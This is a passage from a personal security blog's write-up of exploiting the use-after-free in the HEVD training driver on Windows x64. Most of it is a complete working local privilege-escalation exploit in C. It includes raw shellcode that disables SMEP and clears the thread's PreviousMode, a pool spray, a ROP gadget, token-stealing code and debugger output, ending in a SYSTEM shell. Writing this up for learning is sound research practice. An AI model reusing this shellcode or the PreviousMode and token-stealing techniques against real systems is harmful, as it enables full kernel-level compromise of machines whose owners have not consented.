But, when you try to execute that shellcode we will see a BSOD with the stop code: `KERNEL_SECURITY_CHECK_FAILURE (139)`.

This is because when you do a `ret` is the equivalent of calling `pop rip` with `jmp rip`, where the `pop` instruction retrieves the valuie from the bottom of the stack, which in this case is a return address and in `rsp+0x08`is the function address from the HEVD.sys function that does the Callback.

```c
0:  48 83 c4 08             add    rsp,0x8
4:  c3                      ret
```

Thus, here we can align the stack to ‘bypass’ the GS Cookie.

## Exploiting [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#exploiting)

Frustrated, after struggling to inject a shellcode capable of performing a token hijack into a 0x54-byte buffer (which is impossible because such shellcode typically ranges from 0x60 to 0x100 bytes). I also tried to create dynamic shellcode that would change at runtime to perform a ret2usr, and by disabling SMEP, I could execute code in userland as if nothing had happened. But I wasn’t able to do that either.

With a lot of skill issue in _pwn_, I started doing some research until I found a method that exploited Pipe Attributes, and then, from user mode, executed a token hijacking using two NT API functions; simulating a Arbitrary Read/Write, like the [first post of HEVD explotation](https://yoshlsec.github.io/winint-compilation/winint-arbitrarywrite/).

Both functions were: `NtQuerySetInformationFile` and `NtQueryFilePipeLocalInformation`, reading and writing in the order I’ve listed them. You will be able to dive in in more details in the reosurce details. But in the end, I didn’t use data exact **Data-Only Attack** technique, though I did use that method to find the next post:

[https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)

From that post, I would like to highlight the following paragraph:

> By ensuring the corresponding source byte in the IOCTL input buffer is zero, the copy will clear the PreviousMode field, effectively resulting in its value being interpreted as KernelMode. Targeting PreviousMode like this is a widely popular exploitation technique, as corrupting this one byte in the KTHREAD structure bypasses kernel-mode checks inside syscalls such as NtReadVirtualMemory or NtWriteVirtualMemory, allowing a user-mode attacker to read and write arbitrary kernel memory.

In other words, the functions `NtQuerySetInformationFile` and `NtQueryFilePipeLocalInformation` will be `NtReadVirtualMemory` and `NtWriteVirtualMemory`, respectively.

Important

We are not saying that `NtQuerySetInformationFile` has the same functionality as `NtReadVirtualMemory`, we are talking about the concept of exploitation, not its general function.

If you have some level of windows develpoment, you will be asking, _but those aren’t admin only functions_? (talking about permissions for the object we want to modify)

### PreviousMode [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#previousmode)

The char _PreviousMode_ from the structure _\_KTHREAD_ is responsible for keeping track of where the thread comes from and who initiated the new process. If the bit is up (set in 1), the thread originated in user mode (i.e. a standard .exe file), else the thread comes from the kernel or a system service.

In our windows version, this char can be found the in `0x232` offset from the KTHREAD struct:

```c
0: kd> dt !_KTHREAD PreviousMode
nt!_KTHREAD
   +0x232 PreviousMode : Char
```

Making this value null, kernel mode, a lot of security checks are not validated, since, for perfomance reasons, the kernel works this way. It’s like we have the priv `SeDebugPrivilege`.

Its good to know that if you change the value, the PatchGuard will identify the suspicious change and will crash the system with the error: `CRITICAL_STRUCTURE_CORRUPTION`

![](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/image-6.png)

But don’t worry that we will bypass the **KPP** in the blog ;), running the UAF twice in a single execution.

#### Shellcode debuggin [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#shellcode-debuggin)

To be honest, this part isn’t necesary for the blog, but it’s really helped me understand how it works, and if anyone here is looking to learn, they can follow along with my steps.

```c
nop
nop
nop
nop
nop
nop
nop
nop
mov rax, gs:[0x188]
mov byte ptr [rax + 0x232], 0
xor rax, rax
add rsp, 0x08
ret
```

Shellcode with SMEP bypass:

```c
nop
nop
nop
nop
nop
nop
nop
nop
mov rax, cr4
and rax, 0xffffffffffefffff
mov cr4, rax
mov rax, gs:[0x188]
mov byte ptr [rax + 0x232], 0
xor rax, rax
add rsp, 0x08
ret
```

Shellcode loaded correctly before the gadget execution:

```
10: kd> t
cng!BCryptHashData+0x3ef3:
fffff806`448867e3 e8f8ba0a00      call    fffff806`449322e0
10: kd> uu rax
ffffb904`40aa2ef0 0f20e0          mov     rax,cr4
ffffb904`40aa2ef3 4825ffffefff    and     rax,0FFFFFFFFFFEFFFFFh
ffffb904`40aa2ef9 0f22e0          mov     cr4,rax
ffffb904`40aa2efc 65488b042588010000 mov   rax,qword ptr gs:[188h]
ffffb904`40aa2f05 c6803202000000  mov     byte ptr [rax+232h],0
ffffb904`40aa2f0c 4831c0          xor     rax,rax
ffffb904`40aa2f0f 4883c408        add     rsp,8
ffffb904`40aa2f13 c3              ret
```

- [x]  SMEP Bypassed
- [x]  RAX with \_KTHREAD Structure

```
10: kd> dt nt!_KTHREAD @rax
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 SListFaultAddress : (null)
   +0x020 QuantumTarget    : 0x713fb2c
   +0x028 InitialStack     : 0xffffd781`eb8aec90 Void
   +0x030 StackLimit       : 0xffffd781`eb8a9000 Void
   +0x038 StackBase        : 0xffffd781`eb8af000 Void
   +0x040 ThreadLock       : 0
   +0x048 CycleTime        : 0x13204c2
   +0x050 CurrentRunTime   : 0x81e1b
   +0x054 ExpectedRunTime  : 0x2f1ea9
```

- [x]  PreviousMode set to 0

```
10: kd> dt nt!_KTHREAD @rax PreviousMode
   +0x232 PreviousMode : 0 ''
```

- [x]  No GS Cookie Crash

```
10: kd> t
ffffb904`40aa2f13 c3              ret
10: kd> t
HEVD!UseUaFObjectNonPagedPool+0x84:
fffff806`48ca7cf4 33db            xor     ebx,ebx
```

- [x]  No BSOD Screen
![](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/image-7.png)
- [x]  Checking status of cmd.exe process

```
0: kd> !process 0 0 cmd.exe
PROCESS ffffb10684cb2080
    SessionId: 1  Cid: 0540    Peb: 8bf02ef000  ParentCid: 15dc
    DirBase: 20e1ba000  ObjectTable: ffff8901b4eb0840  HandleCount:  75.
    Image: cmd.exe

0: kd> dt nt!_KTHREAD ffffb10684cb2080 PreviousMode
   +0x232 PreviousMode : 0 ''
```

But anyways, here will appears the BSOD we shown before.

### Final Code [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#final-code)

Instead of pasting the whole C code with the file header, I will print out each functions and a brief explanation of what does, thus that it isn’t illegible code.

#### Header file [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#header-file)

```c
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)

#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL   IOCTL(0x804)
#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL        IOCTL(0x805)
#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL       IOCTL(0x806)
#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL  IOCTL(0x807)

#define UAF_OBJECT_DATA_SIZE   0x5C
#define UAF_CALLBACK_OFFSET    0x00
#define UAF_BUFFER_FIELD_SIZE  0x54

#define OFFSET_EPROCESS_PID    0x2e0
#define OFFSET_EPROCESS_LINKS  0x2e8
#define OFFSET_EPROCESS_TOKEN  0x358

#pragma pack(push, 1)
typedef struct _FAKE_OBJECT_NON_PAGED_POOL {
    PVOID Callback;
    CHAR  Buffer[UAF_BUFFER_FIELD_SIZE];
} FAKE_OBJECT_NON_PAGED_POOL, * PFAKE_OBJECT_NON_PAGED_POOL;
#pragma pack(pop)

static_assert(sizeof(FAKE_OBJECT_NON_PAGED_POOL) == UAF_OBJECT_DATA_SIZE,
    "Size mismatch!");

typedef NTSTATUS(NTAPI* _NtReadVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToRead,
    PULONG NumberOfBytesReaded);

typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten);

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;
```

### getBaseAddr [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#getbaseaddr)

Function code copy from [https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/](https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/).

Useful to leak the some drivers/kernel base address:

```c
ULONGLONG getBaseAddr(LPCWSTR drvName) {
    LPVOID drivers[512];
    DWORD cbNeeded;
    int nDrivers, i = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        WCHAR szDrivers[512];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++) {
            if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
                if (wcscmp(szDrivers, drvName) == 0) {
                    return (ULONGLONG)drivers[i];
                }
            }
        }
    }
    return 0;
}
```

### GetSymbolAddr [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#getsymboladdr)

Uses a local copy of ntoskrnl.exe as a reference to calculate how far a symbol is from the start of the file to apply that distance to the kernel’s actual location in the system’s running memory.

```c
ULONG64 GetSymbolAddr(ULONG64 base, PCSTR symbol) {
    HMODULE hNtos = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtos) return 0;

    PVOID pExport = GetProcAddress(hNtos, symbol);
    if (!pExport) return 0;

    ULONG64 offset = (ULONG64)pExport - (ULONG64)hNtos;
    return base + offset;
}
```

### PerformTokenStealing [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#performtokenstealing)

As the name suggests, it performs token hijacking by simulating an Arbitrary Read/Write.

```c
void PerformTokenStealing(PVOID psInitialSystemProcessAddr, DWORD myPid) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    _NtReadVirtualMemory pNtRead = (_NtReadVirtualMemory)GetProcAddress(ntdll, "NtReadVirtualMemory");
    _NtWriteVirtualMemory pNtWrite = (_NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");

    PVOID currentEprocess = psInitialSystemProcessAddr;
    PVOID systemToken = NULL;
    PVOID myEprocessAddr = NULL;

    char buffer[8];
    ULONG64 pid = 0;

    printf("[+] Searching System and self EPROCESS...\n");
    pNtRead(GetCurrentProcess(), (PVOID)((ULONG64)currentEprocess + OFFSET_EPROCESS_TOKEN), &systemToken, 8, NULL);
    printf("\t[+] System Token found @ 0x%p\n", systemToken);

    PVOID nextProcessLink = currentEprocess;

    while (TRUE) {
        pNtRead(GetCurrentProcess(), (PVOID)((ULONG64)nextProcessLink + OFFSET_EPROCESS_PID), &pid, 8, NULL);

        if (pid == myPid) {
            myEprocessAddr = nextProcessLink;
            printf("\t[+] Self Token found @ 0x%p\n", myEprocessAddr);
            break;
        }

        pNtRead(GetCurrentProcess(), (PVOID)((ULONG64)nextProcessLink + OFFSET_EPROCESS_LINKS), &nextProcessLink, 8, NULL);
        nextProcessLink = (PVOID)((ULONG64)nextProcessLink - OFFSET_EPROCESS_LINKS);
    }

    if (myEprocessAddr && systemToken) {
        pNtWrite(GetCurrentProcess(), (PVOID)((ULONG64)myEprocessAddr + OFFSET_EPROCESS_TOKEN), &systemToken, 8, NULL);
        printf("[+] Token overwrited\n");
    }
}
```

### ExploitUAF [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#exploituaf)

The main function, where the driver is exploited to be able to execute the shellcode we want.

```c
void ExploitUAF(HANDLE hFile, unsigned char* sc, size_t scSize) {
    DWORD bytesReturned;
    FAKE_OBJECT_NON_PAGED_POOL fakeObj;
    memset(&fakeObj, 0, sizeof(fakeObj));

    ULONGLONG cngBase = getBaseAddr(L"cng.sys");
    fakeObj.Callback = (PVOID)(cngBase + 0x0c7e1);
    printf("[*] leaked cng.sys base @ 0x%016llx\n", cngBase);
    printf("[*] Gadget address @ 0x%016llx\n", (cngBase + 0x0c7e1));
    memcpy(fakeObj.Buffer, sc, scSize);

    printf("[*] Freeing UAF Object... (Security)\n");
    DeviceIoControl(hFile, HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL, NULL, 0, NULL, 0, &bytesReturned, NULL);
    printf("[*] Allocating UAF Object...\n");
    DeviceIoControl(hFile, HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL, NULL, 0, NULL, 0, &bytesReturned, NULL);
    printf("[*] Freeing UAF Object...\n");
    DeviceIoControl(hFile, HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL, NULL, 0, NULL, 0, &bytesReturned, NULL);
    printf("[+] Dangling pointer live\n");

    printf("[*] Spraying %d fake objects...\n", 1000);
    for (int i = 0; i < 1000; i++) {
        DeviceIoControl(hFile, HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL,
            &fakeObj, sizeof(fakeObj), NULL, 0, &bytesReturned, NULL);
    }
    printf("[+] Spray done\n");

    DeviceIoControl(hFile, HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL, NULL, 0, NULL, 0, &bytesReturned, NULL);
}
```

### main [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#main)

I would describe it as the wrapper, where all is called in order to successfully execute the exploit.

```c
int main() {
    DWORD bytesReturned = 0;
    HANDLE hFile = CreateFile(
        L"\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Driver not found: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Driver handle: 0x%p\n", hFile);

    unsigned char sc_privs[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x0F\x20\xE0\x48\x25\xFF\xFF\xEF\xFF\x0F\x22\xE0\x65\x48\x8B\x04\x25\x88\x01\x00\x00\xC6\x80\x32\x02\x00\x00\x00\x48\x31\xC0\x48\x83\xC4\x08\xC3"; // 8 x \x90
    unsigned char sc_restore[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x0F\x20\xE0\x48\x0D\x00\x00\x10\x00\x0F\x22\xE0\x65\x48\x8B\x04\x25\x88\x01\x00\x00\xC6\x80\x32\x02\x00\x00\x01\x48\x31\xC0\x48\x83\xC4\x08\xC3";

    printf("[*] Phase 1: PreviousMode = 0...\n");
    ExploitUAF(hFile, sc_privs, sizeof(sc_privs));

    // Exploit
    ULONG64 ntosBase = getBaseAddr(L"ntoskrnl.exe");
    ULONG64 systemEprocessPtr = GetSymbolAddr(ntosBase, "PsInitialSystemProcess");
    ULONG64 systemEprocess;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    _NtReadVirtualMemory pNtRead = (_NtReadVirtualMemory)GetProcAddress(ntdll, "NtReadVirtualMemory");
    pNtRead(GetCurrentProcess(), (PVOID)systemEprocessPtr, &systemEprocess, 8, NULL);
    PerformTokenStealing((PVOID)systemEprocess, GetCurrentProcessId());

    printf("[*] Phase 2: PreviousMode = 1...\n");
    ExploitUAF(hFile, sc_restore, sizeof(sc_restore));

    system("cmd.exe");
    CloseHandle(hFile);
    return 0;
}
```

## Conclusion [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#conclusion)

This is not the typically writeup of use-after-free in HEVD, but after learning a lot of new cool stuff related with windows internals, I recommend all of windows enthusiast to try it out.

I wanted also to list what I have learned, maybe someone while reading this concepts get the enought motivation to learn windows kernel, and do a little bit of kernel freestylee!

- Supervisor Monitoring Execution Protection (SMEP) Bypass
- Kernel Patch Protections (KPP/PatchGuard) Bypass
- GS Cookie / Stack Alignment
- Shellcode development and debuggin
- Simulating Lazarus Rootkit: Admin-to-Kernel Zero-Day
- Stack Pivot
- FengShui / Heap grooming method

I really hope you enjoy this post, contact me if you have any question!

### Resources [Permalink for this section](https://yoshlsec.github.io/winint-compilation/winint-useafterfree/\#resources)

- [https://m2rc.net/posts/hevd-useafterfree/](https://m2rc.net/posts/hevd-useafterfree/)
- [https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/](https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/)
- [https://techcommunity.microsoft.com/blog/askperf/an-introduction-to-pool-tags/372983](https://techcommunity.microsoft.com/blog/askperf/an-introduction-to-pool-tags/372983)
- [https://j00ru.vexillium.org/2011/06/smep-what-is-it-and-how-to-beat-it-on-windows/](https://j00ru.vexillium.org/2011/06/smep-what-is-it-and-how-to-beat-it-on-windows/)
- [https://www.coresecurity.com/sites/default/files/2020-06/Windows%20SMEP%20bypass%20U%20equals%20S\_0.pdf](https://www.coresecurity.com/sites/default/files/2020-06/Windows%20SMEP%20bypass%20U%20equals%20S_0.pdf)
- [https://mdanilor.github.io/posts/hevd-3/](https://mdanilor.github.io/posts/hevd-3/)
- [https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/](https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/)
- [https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/](https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/)
- [https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/)
- [https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)
- [https://learn.microsoft.com/es-es/windows-hardware/drivers/debugger/bug-check-0xc2--bad-pool-caller](https://learn.microsoft.com/es-es/windows-hardware/drivers/debugger/bug-check-0xc2--bad-pool-caller)

[StackOverflow GS x64](https://yoshlsec.github.io/winint-compilation/winint-bofgs/ "StackOverflow GS x64") [Taking Back Control - Windows File Ownership](https://yoshlsec.github.io/winint-compilation/winint-wfownership/ "Taking Back Control - Windows File Ownership")